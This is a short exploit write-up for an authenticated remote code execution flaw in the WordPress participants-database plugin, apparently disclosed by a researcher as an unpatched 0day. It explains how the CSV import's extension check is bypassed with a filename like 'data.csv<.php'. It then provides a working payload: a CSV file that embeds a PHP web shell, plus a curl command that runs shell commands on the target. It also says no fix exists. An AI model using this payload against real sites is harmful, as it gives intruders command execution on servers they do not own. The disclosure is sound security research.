# Participants database authenticated RCE

0day :)

Found: Saturday 2018/01/13

Publicly disclosed: x

By David.
Tested on: Ubuntu 17.04, wordpress 4.9.1, PHP7 development server (`$ php -S`)

This is about the wordpress plugin [participants-database](https://wordpress.org/plugins/participants-database/).

### Info

This exploit abuses the CSV import function of the participants database to upload arbitrary php code.

By default, the exploit requires at least Editor privileges, although this can technically be higher or lower, as administrators can change the authentication level needed to read/write records.

### How it works

The participants database has a function to import a CSV file with entries, put the entries in the database, and place the CSV file in the `/wp-content/uploads/participants-database/` directory.

Due to a broken extension check, you can upload files with arbitrary extensions with some tinkering, like .php files. The plugin is supposed to check if the extension of the file is `.csv`. However, it strips html tags in the filename before checking the extension, but writes the full filename (with html tags) to the aforementioned directory.

This is the offending code snippet:

```php

// wp-content/plugins/participants-database/classes/xnau_CSV_Import.class.php: 140

function check_submission()
{
    $nonce = filter_input(INPUT_POST, '_wpnonce', FILTER_SANITIZE_STRING );
    if ( ! wp_verify_nonce( $nonce, self::nonce ) ) {
      return false;
    }
    $filename = filter_var( $_FILES['uploadedfile']['name'], FILTER_SANITIZE_STRING );
    $check =  pathinfo( $filename, PATHINFO_EXTENSION ) === 'csv';
    if ( $check ) {
      return true;
    }
    $this->set_error_heading( __('Invalid file for import.', 'participants-database') );
    return false;
}

```

We can exploit this by giving up a file called `data.csv<.php`, due to the nature of FILTER_SANITIZE_STRING, which deletes even incomplete tags.

Now we need to tinker a bit with the csv file. The plugin only accepts valid CSV files with some required fields.

This is a working file that gives you a very limited shell.

```
first_name,last_name,address,city,state,country,zip,phone,email,mailing_list,id,<?php echo system($_POST['cmd']);?>
,,,,,,,,,,,
,,,,,,,,,,,
```

After you've uploaded this file, simply do

`curl "http://example.website/wp-content/uploads/participants-database/data.csv<.php" --data "cmd=id"`

To i.e run the `id` command


### Mitigation

As of now, there aren't any mitigations yet, except for fixing the code yourself.

That's it

-David 
